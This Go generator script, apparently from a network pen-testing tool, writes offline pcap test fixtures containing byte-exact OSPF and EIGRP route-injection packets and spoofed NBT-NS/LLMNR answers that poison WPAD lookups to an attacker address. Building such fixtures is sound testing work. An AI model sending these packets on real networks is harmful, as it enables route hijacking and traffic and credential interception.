//go:build ignore

// harvest_routing.go generates routing-injection and rogue-WPAD attack
// reference fixtures into attacks/testdata/routing/*.pcap by crafting the
// exact byte sequences the routing behaviors produce. It is the
// fixture factory for the routing attack behaviors.
//
// Spec-authored (no baseline craft): all fixtures are
// spec-authored because no baseline craft exists in l2l3-audit for these
// three attacks. The fixtures mirror the Go behaviors' craft functions
// byte-for-byte where deterministic.
//
// Fixtures produced:
//   - ospf.pcap:           hello, hello listing the target, db-desc,
//     lsa-update (attack TX)
//   - ospf_restore.pcap:   lsa-flush, goodbye-hello (teardown TX)
//   - ospf_target.pcap:    the target's hello, then its hello listing the
//     attack leg's router ID (RFC 2328 section 10.5, 2-WayReceived), fed
//     via PushRX
//   - eigrp.pcap:          hello with the Parameters TLV (RFC 7868 section
//     6.7.1), null update with the Init flag (section 5.3.3), route-inject
//     update (attack TX)
//   - eigrp_restore.pcap:  goodbye, a hello with the Peer Termination TLV
//     (section 6.7.7) (teardown TX)
//   - eigrp_target.pcap:   the target's hello in AS 100, then its unicast
//     hello acknowledging the null update (section 5.2), fed via PushRX
//   - eigrp_reject.pcap:   the target's goodbye with the Peer Termination
//     TLV, then its older form, a Parameters TLV with K1 to K5 at 255, fed
//     via PushRX
//   - wpad.pcap:           the nbt-ns answer and the llmnr answer, each
//     unicast to the querier with the query's id (attack TX)
//   - wpad_query.pcap:     the client's NBT-NS query (RFC 1002 section
//     4.2.12) and LLMNR query (RFC 4795 section 2.1.1) for wpad, fed via
//     PushRX
//
// The response fixtures are spec-authored from the RFC layouts and decoded
// by gopacket or the owned layer as the second reader; the Wireshark sample
// capture page (https://wiki.wireshark.org/SampleCaptures, fetched
// 2026-10-15) carries no licence statement for its capture files, so no
// frame is copied from one.
//
// Run from the attacks/routing directory:
//
//	go run harvest_routing.go
//
// Fully offline: no sockets, no scapy. Writes pcaps via pcapgo.
package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcapgo"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/fixtureaddr"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

const srcMAC = "00:11:22:33:44:55"

var (
	ospfMcastMAC            = fixtureaddr.MustMAC("01:00:5e:00:00:05")
	eigrpMcastMAC           = fixtureaddr.MustMAC("01:00:5e:00:00:0a")
	broadcastMAC            = fixtureaddr.MustMAC("ff:ff:ff:ff:ff:ff")
	attackerIP              = net.IPv4(10, 0, 0, 99)
	ospfAllSPFRtrs          = net.IPv4(224, 0, 0, 5)
	eigrpMcast              = net.IPv4(224, 0, 0, 10)
	llmnrMcast              = net.IPv4(224, 0, 0, 252)
	targetMAC               = fixtureaddr.MustMAC("00:aa:bb:cc:dd:01")
	targetRouterID   uint32 = 0x0a000002 // 10.0.0.2
	attackerRouterID uint32 = 0x0a000063 // 10.0.0.99

	eigrpFlagInit    uint32 = 0x01
	eigrpFlagGoodbye uint32 = 0x02

	wpacTTL = 30
)

func srcBytes() net.HardwareAddr { return fixtureaddr.MustMAC(srcMAC) }

// genErr holds the first packet-assembly or write failure. [craft] and
// [writePcap] record into it instead of panicking, and [run] returns it, so a
// generator bug exits non-zero through log.Fatal rather than with a stack
// trace.
var genErr error

// fail records the first non-nil error into [genErr].
func fail(err error) {
	if err != nil && genErr == nil {
		genErr = err
	}
}

const (
	ospfHdrLen    = 24
	ospfHelloBody = 20
	ospfLSAHdrLen = 20
)

func main() {
	if err := run(); err != nil {
		log.Fatal(err)
	}
}

func run() error {
	// OSPF fixtures
	writePcap("ospf.pcap", ospfHelloFrame(nil), ospfHelloFrame([]uint32{targetRouterID}), ospfDBDescFrame(), ospfLSAUpdateFrame())
	writePcap("ospf_restore.pcap", ospfLSAFlushFrame(), ospfGoodbyeFrame())
	writePcap("ospf_target.pcap", ospfTargetHelloFrame(nil), ospfTargetHelloFrame([]uint32{attackerRouterID}))

	// EIGRP fixtures
	writePcap("eigrp.pcap", eigrpHelloFrame(), eigrpNullUpdateFrame(), eigrpRouteInjectFrame())
	writePcap("eigrp_restore.pcap", eigrpGoodbyeFrame())
	writePcap("eigrp_target.pcap", eigrpTargetHelloFrame(), eigrpTargetAckFrame())
	writePcap("eigrp_reject.pcap", eigrpRejectFrame(), eigrpRejectK255Frame())

	// WPAD fixtures
	writePcap("wpad.pcap", wpadNBTNSFrame(), wpadLLMNRFrame())
	writePcap("wpad_query.pcap", wpadNBTNSQueryFrame(), wpadLLMNRQueryFrame())

	if genErr != nil {
		return genErr
	}

	fmt.Println("harvest complete")

	return nil
}

// OSPF frames use raw craft, since the fork has no SerializeTo for OSPFv2.

func ospfHeader(ospfType byte, bodyLen int) []byte {
	hdr := make([]byte, ospfHdrLen)
	hdr[0] = 2 // version 2
	hdr[1] = ospfType
	binary.BigEndian.PutUint16(hdr[2:4], uint16(ospfHdrLen+bodyLen))
	binary.BigEndian.PutUint32(hdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(hdr[8:12], 0) // area 0.0.0.0
	return hdr
}

// ospfChecksum computes the OSPFv2 packet checksum from RFC 2328 D.4.
func ospfChecksum(p []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(p); i += 2 {
		if i == 12 || (i >= 16 && i < 24) {
			continue
		}
		sum += uint32(p[i])<<8 | uint32(p[i+1])
	}
	if len(p)%2 == 1 {
		sum += uint32(p[len(p)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// ospfLSAChecksum computes the Router-LSA checksum from RFC 2328 12.1.7.
func ospfLSAChecksum(lsa []byte) uint16 {
	const checksumOffset = 16

	var c0, c1 int
	for i := 2; i < len(lsa); i++ {
		octet := int(lsa[i])
		if i == checksumOffset || i == checksumOffset+1 {
			octet = 0
		}
		c0 = (c0 + octet) % 255
		c1 = (c1 + c0) % 255
	}

	x := ((len(lsa)-checksumOffset-1)*c0 - c1) % 255
	if x <= 0 {
		x += 255
	}
	y := 510 - c0 - x
	if y > 255 {
		y -= 255
	}
	return uint16(x)<<8 | uint16(y)
}

func ospfHelloBodyBytes() []byte {
	body := make([]byte, ospfHelloBody)
	binary.BigEndian.PutUint32(body[0:4], 0xffffff00) // /24
	binary.BigEndian.PutUint16(body[4:6], 10)         // hello interval
	body[6] = 0x02                                    // options: E
	body[7] = 1                                       // priority
	binary.BigEndian.PutUint32(body[8:12], 40)        // dead interval
	binary.BigEndian.PutUint32(body[12:16], 0)        // DR
	binary.BigEndian.PutUint32(body[16:20], 0)        // BDR
	return body
}

func ospfFrame(ospfType byte, body []byte) []byte {
	hdr := ospfHeader(ospfType, len(body))
	payload := append(hdr, body...)
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       ospfMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 89,
		SrcIP:    attackerIP,
		DstIP:    ospfAllSPFRtrs,
	}
	return craft(eth, ip, gopacket.Payload(payload))
}

// ospfHelloFrame builds the attack leg's hello listing neighbors.
func ospfHelloFrame(neighbors []uint32) []byte {
	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyWith(neighbors))
}

// ospfHelloBodyWith appends the neighbor router IDs to the hello body.
func ospfHelloBodyWith(neighbors []uint32) []byte {
	body := ospfHelloBodyBytes()
	for _, n := range neighbors {
		nb := make([]byte, 4)
		binary.BigEndian.PutUint32(nb, n)
		body = append(body, nb...)
	}
	return body
}

func ospfGoodbyeFrame() []byte {
	return ospfFrame(byte(layers.OSPFHello), ospfHelloBodyBytes())
}

func ospfDBDescFrame() []byte {
	body := make([]byte, 8)
	binary.BigEndian.PutUint16(body[0:2], 1500) // MTU
	body[2] = 0x02                              // options: E
	body[3] = 0x07                              // flags: I=1, M=1, MS=1
	binary.BigEndian.PutUint32(body[4:8], 1)    // DD seq
	return ospfFrame(byte(layers.OSPFDatabaseDescription), body)
}

func ospfLSAUpdateFrame() []byte {
	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1) // 1 LSA

	// Router-LSA
	lsaHdr := make([]byte, ospfLSAHdrLen)
	binary.BigEndian.PutUint16(lsaHdr[0:2], 1) // LSAge
	lsaHdr[2] = 0x02
	lsaHdr[3] = byte(layers.RouterLSAtypeV2)
	binary.BigEndian.PutUint32(lsaHdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[8:12], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[12:16], 0x80000001)

	lsaBody := make([]byte, 16)
	lsaBody[0] = 0x00
	lsaBody[1] = 0x00
	binary.BigEndian.PutUint16(lsaBody[2:4], 1)
	binary.BigEndian.PutUint32(lsaBody[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaBody[8:12], 0xffffff00)
	lsaBody[12] = 3
	binary.BigEndian.PutUint16(lsaBody[14:16], 10)

	binary.BigEndian.PutUint16(lsaHdr[18:20], uint16(len(lsaHdr)+len(lsaBody)))

	lsa := append(lsaHdr, lsaBody...)
	binary.BigEndian.PutUint16(lsa[16:18], ospfLSAChecksum(lsa))
	body = append(body, lsa...)
	return ospfFrame(byte(layers.OSPFLinkStateUpdate), body)
}

func ospfLSAFlushFrame() []byte {
	body := make([]byte, 4)
	binary.BigEndian.PutUint32(body, 1)

	lsaHdr := make([]byte, ospfLSAHdrLen)
	binary.BigEndian.PutUint16(lsaHdr[0:2], 3600) // maxAge
	lsaHdr[2] = 0x02
	lsaHdr[3] = byte(layers.RouterLSAtypeV2)
	binary.BigEndian.PutUint32(lsaHdr[4:8], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[8:12], attackerRouterID)
	binary.BigEndian.PutUint32(lsaHdr[12:16], 0x80000001)
	binary.BigEndian.PutUint16(lsaHdr[18:20], ospfLSAHdrLen)
	binary.BigEndian.PutUint16(lsaHdr[16:18], ospfLSAChecksum(lsaHdr))

	body = append(body, lsaHdr...)
	return ospfFrame(byte(layers.OSPFLinkStateUpdate), body)
}

// ospfTargetHelloFrame builds the target's hello (router ID 10.0.0.2, area
// 0) listing neighbors.
func ospfTargetHelloFrame(neighbors []uint32) []byte {
	hdr := make([]byte, ospfHdrLen)
	hdr[0] = 2
	hdr[1] = byte(layers.OSPFHello)
	body := ospfHelloBodyWith(neighbors)
	binary.BigEndian.PutUint32(hdr[4:8], targetRouterID)
	binary.BigEndian.PutUint32(hdr[8:12], 0)
	binary.BigEndian.PutUint16(hdr[2:4], uint16(len(hdr)+len(body)))

	payload := append(hdr, body...)
	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
	eth := &layers.Ethernet{
		SrcMAC:       targetMAC,
		DstMAC:       ospfMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 89,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    ospfAllSPFRtrs,
	}
	return craft(eth, ip, gopacket.Payload(payload))
}

// EIGRP frames go through netpen's owned EIGRP layer.

// eigrpParameters is the Parameters TLV value (RFC 7868 section 6.7.1):
// K1 1, K2 0, K3 1, K4 0, K5 0, K6 0, hold time 15 s.
var eigrpParameters = []byte{1, 0, 1, 0, 0, 0, 0x00, 0x0f}

// eigrpK255 is the older goodbye form: a Parameters TLV with K1 to K5 at
// 255.
var eigrpK255 = []byte{255, 255, 255, 255, 255, 0, 0x00, 0x0f}

func eigrpHelloFrame() []byte {
	return eigrpFrame(&nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: 100,
		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
	})
}

// eigrpNullUpdateFrame builds the update with the Init flag and no TLV
// (RFC 7868 section 5.3.3).
func eigrpNullUpdateFrame() []byte {
	return eigrpFrame(&nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		Flags:            eigrpFlagInit,
		SequenceNumber:   1,
		AutonomousSystem: 100,
	})
}

// eigrpGoodbyeFrame builds the goodbye: a hello carrying the Parameters
// TLV and the Peer Termination TLV (type 0x0007) naming the attack leg's
// IPv4.
func eigrpGoodbyeFrame() []byte {
	return eigrpFrame(&nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: 100,
		TLVs: []nl.EIGRPTLV{
			{Type: 0x0001, Value: eigrpParameters},
			{Type: 0x0007, Value: attackerIP.To4()},
		},
	})
}

// eigrpFromTarget builds Ethernet → IPv4 (proto 88) → EIGRP from the
// target router to dst.
func eigrpFromTarget(dst net.IP, dstMAC net.HardwareAddr, eigrp *nl.EIGRP) []byte {
	eth := &layers.Ethernet{
		SrcMAC:       targetMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 88,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    dst,
	}
	return craft(eth, ip, eigrp)
}

// eigrpTargetAckFrame builds the target's unicast hello acknowledging the
// null update: Ack number 1 (RFC 7868 section 5.2), sent to the attack
// leg's IPv4.
func eigrpTargetAckFrame() []byte {
	return eigrpFromTarget(attackerIP, srcBytes(), &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AckNumber:        1,
		AutonomousSystem: 100,
		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
	})
}

// eigrpRejectK255Frame builds the older goodbye form from the target.
func eigrpRejectK255Frame() []byte {
	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: 100,
		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpK255}},
	})
}

func eigrpRouteInjectFrame() []byte {
	routeValue := buildIPv4RouteTLV(24, net.IPv4(10, 99, 0, 0))
	// The null update took sequence 1, so the route update is 2.
	eigrp := &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeUpdate,
		SequenceNumber:   2,
		VirtualRouterID:  0,
		AutonomousSystem: 100,
		TLVs: []nl.EIGRPTLV{
			{Type: 0x0102, Value: routeValue},
		},
	}
	return eigrpFrame(eigrp)
}

func eigrpFrame(eigrp *nl.EIGRP) []byte {
	eth := &layers.Ethernet{
		SrcMAC:       srcBytes(),
		DstMAC:       eigrpMcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: 88,
		SrcIP:    attackerIP,
		DstIP:    eigrpMcast,
	}
	return craft(eth, ip, eigrp)
}

// eigrpTargetHelloFrame builds the target's hello in AS 100 with the
// Parameters TLV.
func eigrpTargetHelloFrame() []byte {
	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: 100,
		TLVs:             []nl.EIGRPTLV{{Type: 0x0001, Value: eigrpParameters}},
	})
}

// eigrpRejectFrame builds the target's goodbye: a hello carrying the Peer
// Termination TLV (RFC 7868 section 6.7.7) naming the attack leg.
func eigrpRejectFrame() []byte {
	return eigrpFromTarget(eigrpMcast, eigrpMcastMAC, &nl.EIGRP{
		Version:          2,
		Opcode:           nl.EIGRPOpcodeHello,
		AutonomousSystem: 100,
		TLVs: []nl.EIGRPTLV{
			{Type: 0x0001, Value: eigrpParameters},
			{Type: 0x0007, Value: attackerIP.To4()},
		},
	})
}

func buildIPv4RouteTLV(prefixLen int, dest net.IP) []byte {
	var v []byte
	v = append(v, byte(prefixLen))
	networkBytes := (prefixLen + 7) / 8
	v = append(v, dest.To4()[:networkBytes]...)
	metricBytes := make([]byte, 16)
	binary.BigEndian.PutUint32(metricBytes[0:4], 1) // delay = metric (1)
	binary.BigEndian.PutUint32(metricBytes[4:8], 1000)
	metricBytes[9] = 1
	metricBytes[10] = 255
	metricBytes[11] = 1
	v = append(v, metricBytes...)
	return v
}

// WPAD frames use the owned NBNS + LLMNR layers.

// The client that asks for wpad: its MAC, IPv4, and the ports and ids of
// its NBT-NS and LLMNR queries.
var (
	clientMAC           = fixtureaddr.MustMAC("00:aa:bb:cc:dd:01")
	clientIP            = net.IPv4(10, 0, 0, 2)
	nbnsQueryID  uint16 = 0x1234
	llmnrQueryID uint16 = 0x5678
)

// udpFrame builds Ethernet → IPv4 → UDP → layer between the given hosts.
func udpFrame(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, srcPort, dstPort layers.UDPPort, ttl uint8, layer gopacket.SerializableLayer) []byte {
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      ttl,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    srcIP,
		DstIP:    dstIP,
	}
	udp := &layers.UDP{SrcPort: srcPort, DstPort: dstPort}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft(eth, ip, udp, layer)
}

// wpadNBTNSQueryFrame builds the client's NBT-NS name query for WPAD (RFC
// 1002 section 4.2.12), broadcast from port 137.
func wpadNBTNSQueryFrame() []byte {
	nbns := &nl.NBNS{
		ID:        nbnsQueryID,
		Flags:     0x0110, // query, recursion desired, broadcast
		QDCount:   1,
		Questions: []nl.NBNSQuestion{{Name: "WPAD", QType: 0x0020, QClass: 0x0001}},
	}
	return udpFrame(clientMAC, broadcastMAC, clientIP, net.IPv4(255, 255, 255, 255), 137, 137, 128, nbns)
}

// wpadLLMNRQueryFrame builds the client's LLMNR query for wpad (RFC 4795
// section 2.1.1), to the LLMNR group from an ephemeral port.
func wpadLLMNRQueryFrame() []byte {
	llmnr := &nl.LLMNR{
		ID:        llmnrQueryID,
		Flags:     0x0000,
		QDCount:   1,
		Questions: []nl.LLMNRQuestion{{Name: "wpad", QType: 1, QClass: 1}},
	}
	return udpFrame(clientMAC, fixtureaddr.MustMAC("01:00:5e:00:00:fc"), clientIP, llmnrMcast, 51000, 5355, 1, llmnr)
}

// wpadNBTNSFrame builds the answer to the NBT-NS query, unicast to the
// client with the query's id.
func wpadNBTNSFrame() []byte {
	nbns := &nl.NBNS{
		ID:      nbnsQueryID,
		Flags:   0x8500,
		ANCount: 1,
		Answers: []nl.NBNSResourceRecord{
			{
				Name:  "wpad",
				Type:  0x0020,
				Class: 0x0001,
				TTL:   uint32(wpacTTL),
				Data:  nbnsNodeAddr(attackerIP),
			},
		},
	}
	return udpFrame(srcBytes(), clientMAC, attackerIP, clientIP, 137, 137, 64, nbns)
}

func nbnsNodeAddr(ip net.IP) []byte {
	data := make([]byte, 6)
	ip4 := ip.To4()
	copy(data[2:6], ip4)
	return data
}

// wpadLLMNRFrame builds the answer to the LLMNR query, unicast to the
// client's address and port with the query's id (RFC 4795 section 2.3).
func wpadLLMNRFrame() []byte {
	llmnr := &nl.LLMNR{
		ID:      llmnrQueryID,
		Flags:   0x8000,
		ANCount: 1,
		Answers: []nl.LLMNRResourceRecord{
			{
				Name:  "wpad",
				Type:  1,
				Class: 1,
				TTL:   uint32(wpacTTL),
				Data:  attackerIP.To4(),
			},
		},
	}
	return udpFrame(srcBytes(), clientMAC, attackerIP, clientIP, 5355, 51000, 64, llmnr)
}

func craft(layersList ...gopacket.SerializableLayer) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, layersList...); err != nil {
		fail(err)
		return nil
	}
	return append([]byte(nil), buf.Bytes()...)
}

// writePcap writes pkts to path, recording the first failure, its own IO or
// an assembly error [craft] already recorded, into [genErr] and returning
// without writing, so a bad packet never lands in a fixture and [run] reports
// the fault. Each packet is stamped with the epoch, since pcapgo writes the
// wall clock for a zero stamp and every fixture would then change on each
// run.
func writePcap(path string, pkts ...[]byte) {
	if genErr != nil {
		return
	}

	fullPath := filepath.Join("..", "testdata", "routing", filepath.Base(path))
	f, err := os.Create(fullPath)
	if err != nil {
		fail(errs.Wrapf(err, "create %s", fullPath))
		return
	}
	defer func() { _ = f.Close() }()

	w := pcapgo.NewWriter(f)
	if err := w.WriteFileHeader(65535, layers.LinkTypeEthernet); err != nil {
		fail(errs.Wrapf(err, "write header %s", fullPath))
		return
	}

	for _, pkt := range pkts {
		if err := w.WritePacket(gopacket.CaptureInfo{
			Timestamp:     time.Unix(0, 0),
			CaptureLength: len(pkt),
			Length:        len(pkt),
		}, pkt); err != nil {
			fail(errs.Wrapf(err, "write packet %s", fullPath))
			return
		}
	}
	fmt.Println("wrote", fullPath, len(pkts), "packets")
}
